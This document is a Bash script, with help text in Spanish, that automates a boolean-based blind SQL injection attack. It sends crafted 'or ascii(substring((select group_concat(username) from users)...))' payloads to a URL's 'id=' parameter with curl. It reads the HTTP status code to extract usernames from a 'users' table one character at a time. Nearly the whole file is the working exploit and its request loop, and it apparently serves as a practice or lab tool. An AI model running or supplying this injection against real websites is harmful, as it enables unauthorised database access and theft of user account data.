#!/bin/bash
#Author: Juan Garcia aka liandd

#Colours
greenColour="\e[0;32m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m"
blueColour="\e[0;34m"
yellowColour="\e[0;33m"
purpleColour="\e[0;35m"
turquoiseColour="\e[0;36m"
grayColour="\e[0;37m"

#Ctrl_C
trap ctrl_c INT

function ctrl_c() {
  echo -e "\n\n${redColour}[!] Saliendo...${endColour}\n"
  tput cnorm && exit 1
}

function helpPanel() {
  echo -e "\n${yellowColour}[!]${endColour}${grayColour} Uso: ${endColour}${greenColour}$0${endColour} ${purpleColour}-u${endColour} ${blueColour}\"<url.../id=1\"${endColour}\n"
  echo -e "\t${purpleColour}u)${endColour} ${grayColour}Dirección URL en donde se encuentra el parámetro vulnerable a SQLi${endColour}"
  echo -e "\t${purpleColour}h)${endColour} ${grayColour}Panel de ayuda${endColour}"
}

#-- Son SQLi Condicionales basadas en el código de estado de la respueta HTTP (200 o 404)
function booleanblindsqli() {
  local complete_url=$1
  url=$(echo $complete_url | grep -oP ".*\?")
  vulnerable_param=$(echo $complete_url | grep -oP "id=")
  extracted_info=''

  for name_char_pos in $(seq 1 33); do
    found_char=false
    for char_decimal in $(seq 44 44) $(seq 97 122); do

      #-- Convertir decimal a ascii
      local char_ascii=$(printf "\\$(printf '%03o' "$char_decimal")")
      #-- Suponiendo que la columna se llama username y la tabla se llama users
      http_code_responde=$(curl -s -o /dev/null -w "%{http_code}" -X GET "$url" -G --data-urlencode "${vulnerable_param}9 or ascii(substring((select group_concat(username) from users), $name_char_pos, 1)) = $char_decimal")

      if [ "$http_code_responde" -eq 200 ]; then
        extracted_info+="$char_ascii"
        found_char=true
        break
      fi
    done

    if [ "$found_char" = false ]; then
      break
    fi
  done
  echo "${extracted_info%,}"
}

while getopts "u:h" arg; do
  case $arg in
  u) url=$OPTARG ;;
  h) ;;
  esac
done
if [[ $url ]]; then
  booleanblindsqli "$url"
else
  helpPanel
fi
